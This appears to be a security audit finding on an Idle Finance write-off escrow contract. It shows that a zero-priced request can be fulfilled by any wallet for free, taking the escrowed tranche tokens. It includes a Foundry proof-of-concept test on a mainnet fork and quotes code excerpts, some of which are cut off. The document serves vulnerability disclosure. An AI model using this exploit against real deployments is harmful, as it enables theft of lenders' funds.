### Title
Unauthenticated zero-payment fulfillment steals escrowed tranche tokens - (`contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary

`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` accepts a nonzero tranche amount but permits `underlyingsRequested == 0`, while `fullfillWriteOffRequest` is callable by any wallet and only requires the supplied underlying amount to be at least the stored request amount. [1](#0-0) [2](#0-1)  An attacker can therefore fulfill a zero-priced request with a zero-token `transferFrom` and receive all escrowed tranche tokens without paying. [3](#0-2) 

### Finding Description

The escrow records requests under the lender’s address and permits any wallet to act as fulfiller. [4](#0-3) [5](#0-4)  Request creation rejects only `amount == 0`; it does not reject `underlyingsRequested == 0`. [1](#0-0)  During fulfillment, `_underlyings < currentRequest.underlyings` reverts, but a stored request for zero satisfies `0 < 0 == false`. [2](#0-1)  The function then deletes the request, executes a zero-value pull, sends zero underlying net of fees to the lender, and transfers `_tranches` to the attacker. [6](#0-5) 

The vulnerable sequence runs during a running epoch because request creation checks `IdleCDOEpochVariant.isEpochRunning()`. [7](#0-6)  No borrower, owner, manager, guardian, or Keyring-approved role is required to fulfill the request. [8](#0-7) 

### Impact Explanation

Any unprivileged address can permanently take all tranche tokens escrowed under a zero-priced write-off request without transferring underlying consideration. [9](#0-8)  For the tested mainnet deployment, a request containing `10_000e18` AA tranche tokens can be taken for `0` USDC, so the lender’s quantified loss is the full `10_000e18` escrowed tranche balance. [10](#0-9)  This breaks the one-receipt-one-payment invariant of the write-off marketplace: deleting the lender’s request is not coupled to a positive payment. [6](#0-5) 

### Likelihood Explanation

The exploit requires a lender to create, accidentally or intentionally, a request with `underlyingsRequested == 0`. [1](#0-0)  Once such a request exists, exploitation is permissionless, deterministic, non-reentrant through the normal path, and requires no token balance because the pulled amount is zero. [9](#0-8)  The existing tests exercise zero tranche rejection but do not cover zero requested-underlying rejection or zero-payment fulfillment. [11](#0-10) [12](#0-11) 

### Recommendation

Reject write-off requests whose `underlyingsRequested` is zero during `createWriteOffRequest`. [1](#0-0)  Additionally require `_underlyings != 0` and preferably exact equality between `_underlyings` and `currentRequest.underlyings` unless intentional overpayment is required. [13](#0-12)  If overpayment remains supported, calculate the fee only over the requested sale amount or explicitly document and bound excess handling so a zero-price request cannot silently consume escrowed tranches. [3](#0-2) 

### Proof of Concept

Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose setup already forks mainnet, initializes the escrow against the live CDO, and approves `LP` tranche spending. [14](#0-13) 

```solidity
function testZeroPaymentFulfillmentStealsEscrowedTranches() external {
    uint256 requestTranches = 10_000e18;
    address attacker = makeAddr("attacker");

    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);

    // LP escrows tranche tokens but accidentally requests zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestTranches, 0);

    // Any EOA fulfills the stored request with no approval and no payment.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestTranches, 0);

    (uint256 remainingTranches, uint256 remainingUnderlyings) =
        escrow.userRequests(LP);

    assertEq(remainingTranches, 0);
    assertEq(remainingUnderlyings, 0);
    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, requestTranches);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingPre);
}
```

The test passes because `createWriteOffRequest` accepts the zero price and the fulfillment check treats `_underlyings == 0` as sufficient payment. [1](#0-0) [9](#0-8)

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

  function testCreateWriteOffRequest() external {
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    escrow.createWriteOffRequest(0, 1e6);

    uint256 trancheBalancePre = tranche.balanceOf(LP);
    vm.prank(LP);

    assertEq(underlyings, 10000e6, 'write-off request underlyings is wrong');
    assertEq(escrow.pendingUnderlyings(), 10000e6, 'pending underlyings is wrong after first request');

    // create another request

    escrow.createWriteOffRequest(10000e18, 10000e6);
    (tranches, underlyings) = escrow.userRequests(LP);
